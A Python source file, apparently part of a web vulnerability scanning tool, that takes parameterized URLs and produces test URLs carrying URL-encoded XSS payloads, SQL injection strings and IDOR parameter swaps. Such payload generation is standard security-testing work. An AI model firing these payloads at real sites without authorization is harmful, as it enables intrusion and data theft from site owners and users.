import urllib.parse

XSS_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E",
    "%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
]

SQLI_PAYLOADS = [
    "%27%20OR%201=1--",
    "%27%20UNION%20SELECT%20NULL,NULL--",
    "1%20AND%201=1",
    "%27%20OR%20%271%27=%271"
]

IDOR_CANDIDATES = [
    "id", "user_id", "account", "acc", "profile", "doc", "order", "item", "file"
]

def generate_vuln_payload_urls(parameterized_urls):
    """Takes parameterized URLs and injects XSS, SQLi, and IDOR test vectors."""
    xss_urls = []
    sqli_urls = []
    idor_urls = []

    for url in parameterized_urls:
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        if not query_params:
            continue

        # Generate XSS variations
        for payload in XSS_PAYLOADS:
            new_params = []
            for k, v in query_params:
                new_params.append((k, payload))
            new_query = urllib.parse.urlencode(new_params, safe="%")
            new_parsed = parsed._replace(query=new_query)
            xss_urls.append(urllib.parse.urlunparse(new_parsed))

        # Generate SQLi variations
        for payload in SQLI_PAYLOADS:
            new_params = []
            for k, v in query_params:
                new_params.append((k, payload))
            new_query = urllib.parse.urlencode(new_params, safe="%")
            new_parsed = parsed._replace(query=new_query)
            sqli_urls.append(urllib.parse.urlunparse(new_parsed))

        # Generate IDOR variations (incrementing/manipulating sensitive parameter keys)
        for k, v in query_params:
            if any(cand in k.lower() for cand in IDOR_CANDIDATES):
                for test_val in ["1", "2", "0", "9999", "admin", "test"]:
                    new_params = []
                    for pk, pv in query_params:
                        if pk == k:
                            new_params.append((pk, test_val))
                        else:
                            new_params.append((pk, pv))
                    new_query = urllib.parse.urlencode(new_params)
                    new_parsed = parsed._replace(query=new_query)
                    idor_urls.append(urllib.parse.urlunparse(new_parsed))

    return {
        "status": "success",
        "xss_count": len(xss_urls),
        "sqli_count": len(sqli_urls),
        "idor_count": len(idor_urls),
        "xss_urls": list(set(xss_urls)),
        "sqli_urls": list(set(sqli_urls)),
        "idor_urls": list(set(idor_urls))
    }
